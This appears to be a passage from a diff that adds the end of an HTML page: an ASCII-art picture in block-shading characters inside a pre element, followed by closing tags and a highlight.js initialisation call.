+        ░▒░ ░░░░░▒░░░▒░▒▒▒▒▒░▒░█▒▓                                                    
+       ██▓█ ░░░░▒░▒░░▒░▒▒▒ ░▒░▒▒█░                                                    
+       ███▒░░▒ ▒░▒░▒░▓░▒▒░▓░▒░▒▒▒▒▒                                                   
+      ████▒█░░░ ░░▒░░▓▒▒▒▒▒▓▒░░░▒▒▒                                                   
+      █▓█▓█▒▒░░ ░░░░░░▒▒▒▒▒▒▒▒░░░░░▒█                                                 
+      ███▓▓▒▓░░░ ░ ░░░▓▒▒▒▒▒▒▓▒░▒░░░░█                                                
+      ██▓▓▓▓▒▒░░  ░░░▒▓▓▒▒▒▒▒░▓░░░ ░░▒▓                                               
+      █▓▓▓▓▓▓▓▒ ░  ░░▒▒▓▓▒▒▒░░░▒░░░ ░▒▒▓                                              
+      █▓▓▓▓▓▒▓▓░ ░  ░▒▒░▓▓▓▒▒░░░▒░░░ ░▓▒█                                             
+      █▓▓▓▓▓▓▒▒▓░  ░ ░▒▒▓▓▓▓▒▒░░▒▒░░  ░▒▒█                                            
+      █▓▓▓ ▒▒▒▓▒▓    ░░▒▒▓▓▒▒▒░░░▒▒░░  ░▒▓█                                           
+      █▓▒▒▒▓▒▓▒▒▓▓░  ░░▒▒▓▓▒▒▒▒▒░░░░░   ▒▒█                                           
+      ▓▒▒▒▒▒░▒▓▒▓▓▓░ ░░░░░▒▓▒▒▒░ ░░░░   ░▓░█                                          
+      █▓▒░ ░▒▒▒▒░▒▓▓░ ░▒░▒▒▓▓▒░▒▒░░░▒░   ▒▒▓█                                         
+       ▓▓▓ ░░░▒▒▒▒▒▓░  ░░░░▒▓▓▒▒░░░ ░░ ░ ░░░█                                         
+       ██▓ ░▒ ▒░▒▒▒▓▒▓░  ░░░▓▓▓░░▒░▒░▒ ░ ░▒▒▒█                                        
+       █▓▓▒░░░▒▒░▓░▒▒░▓░  ▒░▒▓▓▓░░░░░░░ ░ ▒▓▓░                                        
+        ▓▓▒ ▓░▒▒▒▒▒▒▓▒▒▓░  ▒░▒▓▓░░ ░░ ░ ░░▒░▒▓█                                       
+        ██▒▒▓ ▒▒░▒▒░▓░░▒░░  ░▒▓▓▒  ░░░░░  ░▒▒                                         
+        ██▓▒▓░▒▒▒░░▒▓▒░░▒░░░░░▒▓▓▒░  ░░ ░▓▓                                           
+         █░░▓ ▒▒░▒░▒▒▒▒░░▒░░░░░░▓▒▒░░░░░░ ▒█                                          
+         ██░█░▒░▒▒░▒▒▓▒░░▒▒ ░░░░▒▒▒░░░░░ ░░▒                                          
+          ▓░▓▒▒░░▒▒░▓▓▓▒░░▒░ ░░░░▒▒░▒▒░░░░▓░█                                         
+          █▒▓░▒░▒▒░░▓▓█▒░░░▒░ ░░░▒▒▒ ░ ░░░░░▒                                         
+          █▒▒░▒▒▒▒▒░▓▓▓▒░░░░░░  ░▒▒▒░░░░░▒▓▒                                          
+          █▓░▒▒░▒▓░░▓░▒░░░░░░░░ ░░▒▒▒░░░▒▓░                                           
+           ░░▓▒░▒▒░░▒▒▓▒▒▒▒░░░░░░░▒▒▒░░░░▒                                            
+           ░▒▒░ ▒▒░▓▒▒▓▓▓░░▒▒░░░░░▒▒▒▒▒▒▒                                             
+          ▒▒▒░░ ▓▒▓▓▒▓▓█▓▒░░▒░░▒░▓▒▒ ▓▓█▓                                             
+          █▓░░░▓▒██▓▓█▓▓█░▒▒▒▒▒ ▒░░▒▒▓██▓██                                           
+        █░▓▒░░░█░ ░▒██▒▒█▒▓▒▓█▒░▒█░▓░▒███████                                         
+       █▒▒░░▒▒▒▓▓░▒▓▓▓▒▒██▓█▓█▓▓▒▓█░ ░▒████████                                       
+    </pre >
+  </div>
+
+<script>hljs.highlightAll();</script>
+</body>
+</html></div></html>
